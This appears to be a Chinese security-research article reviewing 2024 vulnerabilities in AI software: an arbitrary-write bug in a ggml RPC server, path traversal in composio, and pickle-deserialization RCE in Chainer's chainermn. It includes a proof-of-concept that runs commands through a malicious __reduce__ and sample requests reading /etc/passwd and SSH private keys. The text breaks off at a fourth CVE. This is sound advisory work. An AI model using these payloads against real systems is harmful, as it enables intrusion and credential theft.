---
title: 2024年度人工智能相关重点安全漏洞盘点
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247510270&idx=1&sn=6e0dfb575d641bc67a2b3f00196df49c&chksm=fa527d40cd25f4569e895e911f8d3e8f3e3bc366ffc8598627f89ba3a175f3b65e348be9866b&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2025-01-19
fetch_date: 2025-10-06T20:09:20.028484
---

# 2024年度人工智能相关重点安全漏洞盘点

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnQubX1QAf36chHTbWVF51Q2pD6vrXnSEibhxtH7khT6LwMhicdxfyG7mfHt2oThD78suTqCWX1v65Pg/0?wx_fmt=jpeg)

# 2024年度人工智能相关重点安全漏洞盘点

原创

智能安全实验室

山石网科安全技术研究院

**一、CVE-2024-42479**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞概述**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&from=appmsg)

在 rpc\_server::set\_tensor 中存在一个“写入任意地址”的漏洞。该漏洞由 ggerganov 于 2024 年 8 月 12 日发布，编号为 GHSA-wcr5-566p-9cwj。受影响的版本为小于 b3561 的版本，已修补版本为 b3561 及以上。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞CVSS**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIFAO1HWvuyUYlFTAr3uolwBqhaicbibbtebh3f1AHB8t0IPc3kLDd93qw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞细节**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&from=appmsg)

漏洞的根源在于 rpc\_tensor 结构中的 data 指针成员，该指针可以被用户控制，从而导致任意地址写入。以下是 rpc\_tensor 结构的定义：

```
#pragma pack(push, 1)struct rpc_tensor {    uint64_t id;    uint32_t type;    uint64_t buffer;    uint32_t ne[GGML_MAX_DIMS];    uint32_t nb[GGML_MAX_DIMS];    uint32_t op;    int32_t  op_params[GGML_MAX_OP_PARAMS / sizeof(int32_t)];    int32_t  flags;    uint64_t src[GGML_MAX_SRC];    uint64_t view_src;    uint64_t view_offs;    uint64_t data;    char name[GGML_MAX_NAME];    char padding[4];};#pragma pack(pop)
```

通过控制 data 指针的值，可以在以下函数调用链中实现任意地址写入：

1. `start\_rpc\_server`

2. `rpc\_serve\_client`

3. `rpc\_server::set\_tensor`

4. `ggml\_backend\_tensor\_set`

5. `ggml\_backend\_cpu\_buffer\_set\_tensor`

在 ggml\_backend\_cpu\_buffer\_set\_tensor函数中，使用 memcpy 实现了写入操作：

```
GGML_CALL static void ggml_backend_cpu_buffer_set_tensor(ggml_backend_buffer_t buffer, struct ggml_tensor * tensor, const void * data, size_t offset, size_t size) {    memcpy((char *)tensor->data + offset, data, size);  // Write-what-where 在此处发生    GGML_UNUSED(buffer);}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞影响**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&from=appmsg)

该漏洞可以被用作任意写入的原语，可能被利用来实现远程代码执行（RCE）。研究人员通过结合另一个任意地址读取漏洞，成功实现了 RCE，展示了该漏洞的严重性。

**受影响版本：**版本 < b3561

**二、CVE-2024-8865**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞概述**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&from=appmsg)

在 composiohq/composio 的 /api/download 端点存在任意文件读取漏洞。该漏洞允许攻击者在未经授权的情况下读取服务器上的任意文件。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞CVSS**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIcNCKbPpDib4DhgGNnkuwRm3TL2pecdr2F76pBbDgwViaHt6icHRFLYVkQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞细节**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&from=appmsg)

问题出在 composio\server\api.py 文件中，\_download\_file\_or\_dir 函数没有对输入的文件路径进行限制和验证。这意味着攻击者可以通过 GET 请求指定任意文件路径，从而读取服务器上的敏感文件。例如，通过请求 /api/download?file=/etc/passwd，攻击者可以访问系统的密码文件。如果服务器以 root 权限运行，攻击者甚至可以读取诸如 /root/.ssh/id\_rsa 等敏感文件，这些文件用于 SSH 密钥认证，可能允许攻击者在没有密码的情况下登录服务器。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞影响**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&from=appmsg)

该漏洞可能导致敏感信息泄露给未经授权的用户，包括但不限于用户凭据、系统配置文件和 SSH 私钥。这可能为攻击者提供进一步攻击的入口，例如未经授权的服务器访问。

**受影响版本：**0.5.0、0.5.1、0.5.2、0.5.3、0.5.4、0.5.5、0.5.6、0.5.7、0.5.8

**三、CVE-2024-48206**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞概述**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&from=appmsg)

Chainer 的 chainermn 模块中存在一个反序列化漏洞，具体在处理 MPI（消息传递接口）通信时。当非根节点接收到数据并执行反序列化操作时，攻击者可以利用此漏洞进行远程代码执行（RCE）。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞CVSS**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIIniaDWXjTEsDBEZ5yGwKXoeTsapf12Xsj0rabrvR3ZE1CVicCw8nujow/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞细节**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&from=appmsg)

在 chainermn 模块中，bcast\_obj 函数负责从根节点广播对象到其他节点。在这个过程中，非根节点在接收数据时进行反序列化，但没有对输入数据进行有效的验证或限制。这使得攻击者可以通过构造恶意的序列化对象，利用该漏洞在目标系统上执行任意命令。

以下是一个简单的示例代码，展示了如何测试该漏洞：

```
import chainermnfrom mpi4py import MPIimport pickle
class SimpleModel:    def __reduce__(self):        return (__import__('os').system, ("id; ls",))  # 反序列化后执行的命令
# 创建恶意对象some = pickle.dumps(SimpleModel())
# 初始化 MPI 通信comm = MPI.COMM_WORLDrank = comm.Get_rank()
# 创建 Chainermn 的 communicatorcommunicator = chainermn.create_communicator('naive')
# `rank 0` 节点发送数据，其他节点接收数据if rank == 0:    data = SimpleModel()  # 根节点创建恶意数据else:    data = None
# 广播数据data = communicator.bcast_obj(data, root=0)
# 打印接收到的数据print(f"节点 (rank {rank}): 收到数据 '{data}'")
# 示例：进行集合操作（如果需要）data_to_gather = f"Data from {rank}"gathered_data = comm.gather(some, root=0)
# `rank 0` 节点输出收集到的数据if rank == 0:    print(f"节点 (rank {rank}): 收到的数据 {gathered_data}")
# 同步所有进程comm.Barrier()
```

在这个示例中，SimpleModel 类定义了一个 \_\_reduce\_\_ 方法，该方法在反序列化时执行 os.system 命令。通过广播这个恶意对象，攻击者可以在所有参与的节点上执行任意命令。

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞影响**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&from=appmsg)

该漏洞的影响是严重的，因为它允许攻击者通过网络发送恶意序列化数据，从而在目标系统上执行任意代码。这可能导致以下后果：

**任意命令执行：**攻击者可以执行系统命令，获取系统控制权。

**数据泄露：**攻击者可以访问和窃取敏感信息。

**系统破坏：**攻击者可以破坏系统或安装恶意软件。

**四、CVE-2024-43598**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsIVBuoicicyqeotwDOPkE19Q3hcZWmwPESaMribKOjDF39oK1w3lPtM3iaicQ/640?wx_fmt=png&from=appmsg)

**漏洞概述**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSrcNn60ZcibTxQIp7icI1YsI7B0dPpcLTmgTz4HmrFvZsqmXuYPogDbZTRYLP7EmIhTsBTpgyVaz3g/640?wx_fmt=png&...